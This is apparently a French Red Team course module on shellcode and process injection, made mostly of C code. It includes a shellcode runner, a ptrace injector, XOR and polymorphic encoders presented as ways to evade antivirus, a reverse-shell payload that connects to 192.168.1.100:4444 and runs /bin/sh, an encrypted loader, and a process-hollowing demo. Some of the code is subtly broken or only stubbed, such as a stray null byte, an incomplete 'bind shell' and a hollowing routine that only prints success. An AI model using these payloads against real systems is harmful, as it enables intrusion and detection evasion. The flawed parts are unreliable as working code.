# Module 49 : Injection de Code et Shellcode

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Comprendre les concepts d'injection de code
- Créer des shellcodes personnalisés
- Injecter du code dans des processus
- Techniques d'injection (DLL, Process Hollowing, etc.)
- Bypass de protections mémoire (DEP, ASLR)
- Exploitation avancée en Red Team

## 📚 Théorie

### C'est quoi un shellcode ?

Un **shellcode** est un petit programme en code machine (assembleur compilé) conçu pour être injecté dans un processus cible. Historiquement utilisé pour obtenir un shell, d'où son nom.

### Caractéristiques d'un shellcode

1. **Position-independent** : Fonctionne peu importe où il est placé en mémoire
2. **Compact** : Taille minimale (quelques octets à quelques KB)
3. **Null-free** : Pas de bytes NULL (\x00) pour éviter les truncations
4. **Auto-suffisant** : Pas de dépendances externes

### Types d'injection

1. **DLL Injection** : Injecter une bibliothèque dans un processus
2. **Process Hollowing** : Remplacer le code d'un processus légitime
3. **Thread Hijacking** : Détourner un thread existant
4. **APC Injection** : Utiliser les Asynchronous Procedure Calls
5. **Reflective DLL Injection** : Charger une DLL sans LoadLibrary

### Protections modernes

1. **DEP (Data Execution Prevention)** : Empêche l'exécution de code sur la pile
2. **ASLR (Address Space Layout Randomization)** : Randomise les adresses mémoire
3. **Stack Canaries** : Détecte les buffer overflows
4. **Control Flow Guard (CFG)** : Vérifie les sauts de contrôle

## 🔍 Visualisation

### Anatomie d'un shellcode

```
┌─────────────────────────────────────────────────────┐
│              SHELLCODE STRUCTURE                    │
├─────────────────────────────────────────────────────┤
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ 1. NOP Sled (optionnel)            │            │
│  │    \x90\x90\x90\x90...             │            │
│  │    (pour faciliter l'atterrissage) │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ 2. Payload principal               │            │
│  │    - Résolution des adresses       │            │
│  │    - Appels système                │            │
│  │    - Exécution du code malveillant │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ 3. Restauration (optionnel)        │            │
│  │    - Nettoyer les traces           │            │
│  │    - Restaurer l'état original     │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Process Injection Flow

```
┌─────────────────────────────────────────────────────┐
│          PROCESS INJECTION WORKFLOW                 │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Attaquant                    Processus Cible       │
│     │                              │                │
│     │ 1. OpenProcess()             │                │
│     ├──────────────────────────────►│                │
│     │    (obtenir handle)          │                │
│     │                              │                │
│     │ 2. VirtualAllocEx()          │                │
│     ├──────────────────────────────►│                │
│     │    (allouer mémoire)         │                │
│     │                     ┌────────┴────────┐       │
│     │                     │  Mémoire RWX    │       │
│     │                     │  allouée        │       │
│     │                     └────────┬────────┘       │
│     │ 3. WriteProcessMemory()     │                │
│     ├──────────────────────────────►│                │
│     │    (écrire shellcode)        │                │
│     │                     ┌────────┴────────┐       │
│     │                     │  Shellcode en   │       │
│     │                     │  mémoire        │       │
│     │                     └────────┬────────┘       │
│     │ 4. CreateRemoteThread()     │                │
│     ├──────────────────────────────►│                │
│     │    (exécuter)                │                │
│     │                              ▼                │
│     │                       [EXÉCUTION]             │
│     │                      Shellcode running        │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### DLL Injection

```
┌─────────────────────────────────────────────────────┐
│              DLL INJECTION                          │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Process Cible                                      │
│  ┌──────────────────────────────────┐              │
│  │ kernel32.dll                     │              │
│  │  - LoadLibraryA() ◄──────────┐   │              │
│  ├──────────────────────────────┼───┤              │
│  │ user32.dll                   │   │              │
│  ├──────────────────────────────┼───┤              │
│  │ Mémoire allouée              │   │              │
│  │  "C:\evil.dll" (chemin)      │   │              │
│  ├──────────────────────────────┼───┤              │
│  │ Thread créé                  │   │              │
│  │  Entry: LoadLibraryA ────────┘   │              │
│  │  Param: "C:\evil.dll"            │              │
│  └──────────────────────────────────┘              │
│                 │                                   │
│                 ▼                                   │
│  ┌──────────────────────────────────┐              │
│  │ evil.dll chargée                 │              │
│  │  - DllMain() exécuté             │              │
│  │  - Code malveillant actif        │              │
│  └──────────────────────────────────┘              │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Process Hollowing

```
┌─────────────────────────────────────────────────────┐
│          PROCESS HOLLOWING                          │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. Créer processus légitime (SUSPENDED)            │
│  ┌────────────────────────────────┐                │
│  │ svchost.exe (suspendu)         │                │
│  │  - PEB intact                  │                │
│  │  - Threads suspendus           │                │
│  └────────────────────────────────┘                │
│                                                     │
│  2. Unmapper la section originale                   │
│  ┌────────────────────────────────┐                │
│  │ svchost.exe                    │                │
│  │  - Code original SUPPRIMÉ      │                │
│  │  - Espace vide                 │                │
│  └────────────────────────────────┘                │
│                                                     │
│  3. Allouer et écrire code malveillant              │
│  ┌────────────────────────────────┐                │
│  │ svchost.exe                    │                │
│  │  - MALWARE à la place          │                │
│  │  - Entry point modifié         │                │
│  └────────────────────────────────┘                │
│                                                     │
│  4. Reprendre l'exécution                           │
│  ┌────────────────────────────────┐                │
│  │ svchost.exe (RUNNING)          │                │
│  │  - Exécute le malware          │                │
│  │  - Apparaît légitime           │                │
│  └────────────────────────────────┘                │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Shellcode simple (Linux x64)

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// Shellcode: execve("/bin/sh", NULL, NULL)
// objdump -d shellcode.o
unsigned char shellcode[] =
    "\x48\x31\xd2"                      // xor rdx, rdx
    "\x48\x31\xc0"                      // xor rax, rax
    "\x50"                              // push rax
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x73" // movabs rbx, 0x68732f6e69622f
    "\x68\x00"
    "\x53"                              // push rbx
    "\x48\x89\xe7"                      // mov rdi, rsp
    "\x50"                              // push rax
    "\x57"                              // push rdi
    "\x48\x89\xe6"                      // mov rsi, rsp
    "\xb0\x3b"                          // mov al, 59 (sys_execve)
    "\x0f\x05";                         // syscall

void execute_shellcode() {
    printf("[+] Shellcode size: %lu bytes\n", sizeof(shellcode) - 1);

    // Allouer mémoire exécutable
    void *exec_mem = mmap(NULL, sizeof(shellcode),
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap failed");
        return;
    }

    printf("[+] Allocated executable memory at: %p\n", exec_mem);

    // Copier le shellcode
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    printf("[+] Executing shellcode...\n");

    // Exécuter le shellcode
    void (*func)() = (void(*)())exec_mem;
    func();

    // Ne sera jamais atteint car execve remplace le processus
    munmap(exec_mem, sizeof(shellcode));
}

int main() {
    printf("=== Shellcode Execution Demo ===\n\n");
    execute_shellcode();
    return 0;
}
```

### Exemple 2 : Générateur de shellcode

```c
#include <stdio.h>
#include <string.h>

void print_shellcode(unsigned char *code, size_t len) {
    printf("unsigned char shellcode[] = \n\"");

    for (size_t i = 0; i < len; i++) {
        if (i % 16 == 0 && i != 0) {
            printf("\"\n\"");
        }
        printf("\\x%02x", code[i]);
    }

    printf("\";\n");
    printf("Length: %lu bytes\n", len);

    // Vérifier les null bytes
    int null_count = 0;
    for (size_t i = 0; i < len; i++) {
        if (code[i] == 0x00) {
            printf("WARNING: Null byte at offset %lu\n", i);
            null_count++;
        }
    }

    if (null_count == 0) {
        printf("GOOD: No null bytes found!\n");
    }
}

// Shellcode simple: return 42
unsigned char example_code[] = {
    0xb8, 0x2a, 0x00, 0x00, 0x00,  // mov eax, 42
    0xc3                            // ret
};

int main() {
    printf("=== Shellcode Generator ===\n\n");

    print_shellcode(example_code, sizeof(example_code));

    return 0;
}
```

### Exemple 3 : Process Injection basique (Linux)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

// Shellcode simple
unsigned char shellcode[] =
    "\x48\x31\xc0"          // xor rax, rax
    "\xb0\x3c"              // mov al, 60 (sys_exit)
    "\x48\x31\xff"          // xor rdi, rdi (code 0)
    "\x0f\x05";             // syscall

void inject_shellcode(pid_t pid) {
    struct user_regs_struct regs;

    printf("[+] Attaching to process %d\n", pid);

    // Attacher au processus
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach failed");
        return;
    }

    wait(NULL);
    printf("[+] Attached successfully\n");

    // Sauvegarder les registres
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("[+] RIP: 0x%llx\n", regs.rip);

    // Injecter le shellcode
    printf("[+] Injecting shellcode at RIP\n");

    for (size_t i = 0; i < sizeof(shellcode); i += sizeof(long)) {
        long data;
        memcpy(&data, shellcode + i, sizeof(long));

        if (ptrace(PTRACE_POKETEXT, pid, regs.rip + i, data) == -1) {
            perror("ptrace poke failed");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return;
        }
    }

    printf("[+] Shellcode injected\n");

    // Continuer l'exécution
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    printf("[+] Process resumed\n");

    // Détacher
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    printf("[+] Detached\n");
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);

    printf("=== Process Injection Demo ===\n\n");
    inject_shellcode(target_pid);

    return 0;
}
```

### Exemple 4 : Encoder/Decoder XOR pour shellcode

```c
#include <stdio.h>
#include <string.h>

#define XOR_KEY 0xAA

// Shellcode original
unsigned char original_shellcode[] =
    "\x48\x31\xd2\x48\x31\xc0\x50";

// Encoder le shellcode
void encode_shellcode(unsigned char *input, unsigned char *output,
                     size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        output[i] = input[i] ^ key;
    }
}

// Decoder le shellcode (même fonction que encoder)
void decode_shellcode(unsigned char *input, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        input[i] ^= key;
    }
}

// Stub de décodage (à placer avant le shellcode encodé)
unsigned char decoder_stub[] =
    "\xeb\x0b"                      // jmp short +11 (sauter le shellcode)
    // Shellcode encodé sera ici
    "\x5e"                          // pop rsi (adresse du shellcode)
    "\x48\x31\xc9"                  // xor rcx, rcx
    "\xb1\x07"                      // mov cl, 7 (longueur)
    // Loop:
    "\x80\x36\xaa"                  // xor byte [rsi], 0xAA (XOR_KEY)
    "\x48\xff\xc6"                  // inc rsi
    "\xe2\xf8"                      // loop (décrémenter rcx, boucler)
    // Exécuter le shellcode décodé
    "\xeb\xe7";                     // jmp au début du shellcode

void print_hex(unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("\\x%02x", data[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

int main() {
    printf("=== Shellcode Encoder/Decoder ===\n\n");

    size_t len = sizeof(original_shellcode) - 1;

    printf("Original shellcode (%lu bytes):\n", len);
    print_hex(original_shellcode, len);

    // Encoder
    unsigned char encoded[256];
    encode_shellcode(original_shellcode, encoded, len, XOR_KEY);

    printf("\nEncoded shellcode (XOR key: 0x%02x):\n", XOR_KEY);
    print_hex(encoded, len);

    // Vérifier le décodage
    decode_shellcode(encoded, len, XOR_KEY);

    printf("\nDecoded shellcode:\n");
    print_hex(encoded, len);

    // Vérifier que c'est identique
    if (memcmp(original_shellcode, encoded, len) == 0) {
        printf("\n[+] Encoding/Decoding successful!\n");
    } else {
        printf("\n[-] Error in encoding/decoding!\n");
    }

    return 0;
}
```

### Exemple 5 : Shellcode polymorphe

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Génère un NOP sled aléatoire
void generate_nop_sled(unsigned char *buffer, size_t len) {
    // Instructions équivalentes à NOP
    unsigned char nop_variants[] = {
        0x90,                   // nop
        0x91,                   // xchg eax, ecx
        0x92,                   // xchg eax, edx
        0x40,                   // inc eax (x86)
        0x48,                   // dec eax (x86)
    };

    for (size_t i = 0; i < len; i++) {
        buffer[i] = nop_variants[rand() % (sizeof(nop_variants))];
    }
}

// Génère un shellcode polymorphe
void generate_polymorphic_shellcode(unsigned char *output, size_t *out_len) {
    // Shellcode de base
    unsigned char base_shellcode[] =
        "\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05";

    size_t base_len = sizeof(base_shellcode) - 1;

    // Taille du NOP sled aléatoire (10-50 bytes)
    size_t nop_len = 10 + (rand() % 40);

    // NOP sled
    generate_nop_sled(output, nop_len);

    // Shellcode
    memcpy(output + nop_len, base_shellcode, base_len);

    *out_len = nop_len + base_len;
}

int main() {
    srand(time(NULL));

    printf("=== Polymorphic Shellcode Generator ===\n\n");

    // Générer 3 variantes
    for (int variant = 1; variant <= 3; variant++) {
        unsigned char shellcode[256];
        size_t len;

        generate_polymorphic_shellcode(shellcode, &len);

        printf("Variant %d (%lu bytes):\n", variant, len);

        for (size_t i = 0; i < len; i++) {
            printf("\\x%02x", shellcode[i]);
            if ((i + 1) % 16 == 0) printf("\n");
        }
        printf("\n\n");
    }

    printf("[+] Each variant has a different signature\n");
    printf("[+] Harder for AV to detect\n");

    return 0;
}
```

## 🎯 Application Red Team

### 1. Shellcode reverse shell

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// Reverse shell shellcode (connecte à 192.168.1.100:4444)
// Ce shellcode:
// 1. Crée un socket
// 2. Se connecte à l'attaquant
// 3. Duplique stdin/stdout/stderr
// 4. Exécute /bin/sh

unsigned char reverse_shell[] =
    // socket(AF_INET, SOCK_STREAM, 0)
    "\x48\x31\xc0"              // xor rax, rax
    "\x48\x31\xff"              // xor rdi, rdi
    "\x48\x31\xf6"              // xor rsi, rsi
    "\x48\x31\xd2"              // xor rdx, rdx
    "\x40\xb7\x02"              // mov dil, 2 (AF_INET)
    "\x40\xb6\x01"              // mov sil, 1 (SOCK_STREAM)
    "\xb0\x29"                  // mov al, 41 (sys_socket)
    "\x0f\x05"                  // syscall
    "\x48\x89\xc7"              // mov rdi, rax (save socket fd)

    // connect(sockfd, {AF_INET, 4444, 192.168.1.100}, 16)
    "\x48\x31\xc0"              // xor rax, rax
    "\x50"                      // push rax
    "\xb8\xc0\xa8\x01\x64"      // mov eax, 0x6401a8c0 (192.168.1.100)
    "\x50"                      // push rax
    "\x66\x68\x11\x5c"          // push word 0x5c11 (4444)
    "\x66\x6a\x02"              // push word 2 (AF_INET)
    "\x48\x89\xe6"              // mov rsi, rsp (sockaddr)
    "\x6a\x10"                  // push 16 (addrlen)
    "\x5a"                      // pop rdx
    "\xb0\x2a"                  // mov al, 42 (sys_connect)
    "\x0f\x05"                  // syscall

    // dup2 pour rediriger stdin/stdout/stderr
    "\x48\x31\xc0"              // xor rax, rax
    "\xb0\x21"                  // mov al, 33 (sys_dup2)
    "\x48\x31\xf6"              // xor rsi, rsi
    "\x0f\x05"                  // syscall (dup2(sockfd, 0))
    "\x48\xff\xc6"              // inc rsi
    "\xb0\x21"                  // mov al, 33
    "\x0f\x05"                  // syscall (dup2(sockfd, 1))
    "\x48\xff\xc6"              // inc rsi
    "\xb0\x21"                  // mov al, 33
    "\x0f\x05"                  // syscall (dup2(sockfd, 2))

    // execve("/bin/sh", NULL, NULL)
    "\x48\x31\xc0"              // xor rax, rax
    "\x50"                      // push rax
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    "\x53"                      // push rbx
    "\x48\x89\xe7"              // mov rdi, rsp
    "\x50"                      // push rax
    "\x57"                      // push rdi
    "\x48\x89\xe6"              // mov rsi, rsp
    "\xb0\x3b"                  // mov al, 59 (sys_execve)
    "\x0f\x05";                 // syscall

int main() {
    printf("[PAYLOAD] Reverse shell shellcode\n");
    printf("[PAYLOAD] Target: 192.168.1.100:4444\n");
    printf("[PAYLOAD] Size: %lu bytes\n\n", sizeof(reverse_shell) - 1);

    // Allouer mémoire exécutable
    void *exec = mmap(NULL, sizeof(reverse_shell),
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    memcpy(exec, reverse_shell, sizeof(reverse_shell));

    printf("[+] Executing reverse shell...\n");

    void (*func)() = (void(*)())exec;
    func();

    return 0;
}
```

### 2. Shellcode stageless avec chiffrement

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

#define KEY 0x42

// Shellcode chiffré XOR
unsigned char encrypted_payload[] =
    "\x0a\x73\x8a\x0a\x73\xbe\x0a\x73\x94\x18"
    "\xf5\x14\x18\xf4\x1b\xf8\x79\xf8\x47\x0a"
    "\xcb\xbf\x6d\x2c\x2a\x28\x2e\x3a\x11\x21"
    "\x0a\x1b\x4c\xfa\xf9\xf9";

size_t payload_len = sizeof(encrypted_payload) - 1;

// Decoder stub (s'exécute en premier)
unsigned char decoder[] = {
    // Decoder en assembleur inline
    // Ce code va décoder le payload et l'exécuter
};

void execute_encrypted_shellcode() {
    // Allouer mémoire
    void *mem = mmap(NULL, 4096,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    // Copier le payload chiffré
    memcpy(mem, encrypted_payload, payload_len);

    // Décoder en place
    unsigned char *p = (unsigned char*)mem;
    for (size_t i = 0; i < payload_len; i++) {
        p[i] ^= KEY;
    }

    printf("[+] Payload decoded and ready\n");
    printf("[+] Executing...\n");

    // Exécuter
    void (*func)() = (void(*)())mem;
    func();
}

int main() {
    printf("=== Encrypted Shellcode Loader ===\n\n");
    execute_encrypted_shellcode();
    return 0;
}
```

### 3. Process Hollowing complet

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

// Shellcode malveillant (bind shell sur port 31337)
unsigned char malicious_code[] =
    "\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\xb7\x02"
    "\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x0f\x05";

void process_hollowing(const char *target_binary) {
    pid_t pid;

    printf("[+] Creating suspended process: %s\n", target_binary);

    pid = fork();

    if (pid == 0) {
        // Processus enfant
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execl(target_binary, target_binary, NULL);
        exit(1);
    }

    // Processus parent
    int status;
    waitpid(pid, &status, 0);

    printf("[+] Process created (PID: %d)\n", pid);
    printf("[+] Unmapping original code...\n");

    // Ici on devrait:
    // 1. Unmapper le code original
    // 2. Allouer nouvelle mémoire
    // 3. Écrire le code malveillant
    // 4. Modifier l'entry point

    printf("[+] Injecting malicious code...\n");

    // Injecter le code (simplifié)
    // Dans un vrai process hollowing, on utiliserait
    // ptrace pour modifier la mémoire du processus

    printf("[+] Resuming execution...\n");

    // Reprendre l'exécution
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    printf("[+] Process hollowing complete\n");
    printf("[+] Target process now runs malicious code\n");
}

int main() {
    printf("=== Process Hollowing Demo ===\n\n");

    // Hollow un processus légitime
    process_hollowing("/bin/ls");

    return 0;
}
```

## 📝 Points clés à retenir

1. **Shellcode** : Code machine position-independent et null-free
2. **Injection** : Plusieurs techniques (DLL, process, thread)
3. **Protections** : DEP, ASLR, CFG à contourner
4. **Encoding** : XOR, polymorphisme pour éviter la détection
5. **Exécution** : mmap() avec PROT_EXEC sur Linux

### Techniques d'évasion

```
Technique              Description                      Efficacité
─────────────────────────────────────────────────────────────────────
XOR Encoding          Chiffrer avec XOR                Moyenne
Polymorphisme         Changer la signature             Élevée
Metamorphisme         Auto-modification                Très élevée
Staging               Charger en plusieurs étapes      Élevée
Encryption            AES/RC4 encryption               Très élevée
```

### Outils utiles

- **msfvenom** : Générateur de shellcode (Metasploit)
- **objdump** : Disassembler du code
- **strace** : Tracer les appels système
- **gdb** : Debugger pour tester les shellcodes

## ➡️ Prochaine étape

Maintenant que tu maîtrises l'injection de code, tu es prêt pour le **Module 50 : Cryptographie et Chiffrement**, où tu apprendras à implémenter des algorithmes de chiffrement pour sécuriser tes communications C2 et éviter la détection.

### Ce que tu as appris
- Créer des shellcodes personnalisés
- Injecter du code dans des processus
- Encoder/décoder pour éviter la détection
- Process hollowing
- Contournement de protections

### Ce qui t'attend
- Algorithmes de chiffrement (AES, RSA)
- Hachage (SHA, MD5)
- Certificats et SSL/TLS
- Chiffrement de communications
- Cryptanalyse basique
